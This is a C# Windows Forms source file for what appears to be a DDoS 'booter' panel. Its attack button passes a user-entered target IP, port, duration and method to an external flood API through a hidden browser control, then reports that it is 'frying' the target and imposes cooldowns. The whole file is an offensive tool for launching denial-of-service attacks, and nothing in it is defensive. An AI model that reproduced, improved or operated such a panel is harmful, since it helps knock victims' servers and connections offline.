using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Panel_Template
{
    public partial class Panel : Form
    {
        public static bool frying;
        private string IpString;
        public static string MethodString;
        private string PortString;
        public string TimeString;

        public Panel()
        {
            InitializeComponent();
        }

        private void Panel_Load(object sender, EventArgs e)
        {

        }

        private void exitBtn_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void miniBtn_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void attackBtn_Click(object sender, EventArgs e)
        {
            CheckIP();
            CheckMethod();
            CheckPort();
            CheckTime();
            CheckBootAsync();
        }

        private async Task CheckBootAsync()
        {
            try
            {
                if (frying)
                {
                    //task.delay uses milliseconds, api uses seconds, so convert seconds to milliseconds
                    if (timeDropDown.Text == "100")
                    {
                        MessageBox.Show("You must wait 100 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(100000);
                    }
                    else if (timeDropDown.Text == "200")
                    {
                        MessageBox.Show("You must wait 200 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(200000);
                    }
                    else if (timeDropDown.Text == "300")
                    {
                        MessageBox.Show("You must wait 300 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(300000);
                    }
                    else if (timeDropDown.Text == "400")
                    {
                        MessageBox.Show("You must wait 400 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(400000);
                    }
                    else if (timeDropDown.Text == "500")
                    {
                        MessageBox.Show("You must wait 500 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(500000);
                    }
                    else if (timeDropDown.Text == "600")
                    {
                        MessageBox.Show("You must wait 600 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(600000);
                    }
                    else if (timeDropDown.Text == "700")
                    {
                        MessageBox.Show("You must wait 700 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(700000);
                    }
                    else if (timeDropDown.Text == "800")
                    {
                        MessageBox.Show("You must wait 800 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(800000);
                    }
                    else if (timeDropDown.Text == "900")
                    {
                        MessageBox.Show("You must wait 900 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(400000);
                    }
                    else if (timeDropDown.Text == "1000")
                    {
                        MessageBox.Show("You must wait 1000 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(1000000);
                    }
                    else if (timeDropDown.Text == "1200")
                    {
                        MessageBox.Show("You must wait 1200 seconds or pause your attack", Application.ProductName);
                        await Task.Delay(1200000);
                    }
                }
                if (targetTextBox.Text == string.Empty || targetTextBox.Text == string.Empty || targetTextBox.Text == string.Empty || timeDropDown.Text == string.Empty)
                {
                    MessageBox.Show("Please enter text in all fields", Application.ProductName);
                }
                else
                {
                    //the browser is hidden behind the attack button
                    browser.Navigate("https://api.relevant.network/rs/api.php?service=flood&key=keyhere&host=" + IpString + "&port=" + PortString + "&time=" + TimeString + "&method=" + MethodString + "");
                    MessageBox.Show($"Frying {targetTextBox.Text} using {MethodString} on port {PortString} for {TimeString} seconds", Application.ProductName);
                    frying = true;
                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void CheckIP()
        {
            IpString = targetTextBox.Text;
        }

        private void CheckMethod()
        {
            MethodString = methodDropDown.Text;
        }

        private void CheckPort()
        {
            PortString = portTextBox.Text;
        }

        private void CheckTime()
        {
            TimeString = timeDropDown.Text;
        }
    }
}
